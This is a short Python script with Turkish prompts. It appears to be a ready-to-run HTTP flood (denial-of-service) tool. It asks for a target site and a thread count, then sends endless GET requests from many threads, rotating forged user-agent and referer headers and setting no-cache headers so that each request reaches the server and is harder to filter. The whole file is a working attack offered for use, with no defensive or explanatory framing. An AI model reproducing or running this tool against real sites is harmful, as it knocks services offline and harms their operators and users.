import urllib3
from threading import Thread
import random

headers_useragents=[]
headers_referers=[]

headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
headers_referers.append('http://www.google.com/?q=')
headers_referers.append('http://www.usatoday.com/search/results?q=')
headers_referers.append('http://engadget.search.aol.com/search?q=')


print("""
Bu Tool Kullanılarak Hedef Siteye Sürekli Olarak istekler Gönderilir
Ve Kaç İstek Gönderildiği Console'a Yazılır!\n""")
rhost = str(input("Hedef Siteyi Giriniz : "))
threads = int(input("Açılacak Çekirdek Sayısı : "))
url = urllib3.PoolManager()
headers_referers.append(rhost)
no_cache = 'no-cache'
isochange = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
keep_alive = 'keep-alive'
if "https://" in rhost:
    host = rhost.replace("https://", "")
else:
    host = rhost.replace("http://", "")
i = 1
def sitedos():
    global i
    while True:
        connection1 = url.request('GET', rhost, headers={
            'User-Agent': random.choice(headers_useragents),
            'Cache-Control': no_cache,
            'Accept-Charset': isochange,
            'Referer': random.choice(headers_referers),
            'Keep-Alive': str(random.randint(110,120)),
            'Connection': keep_alive,
            'Host': host,
            'Content-Type': 'application/x-www-form-urlencoded'
            })
        i += 1
        print("Gönderilen Request Sayısı : ", i)

for g in range(1, threads):
    t = Thread(target = sitedos)
    t.start()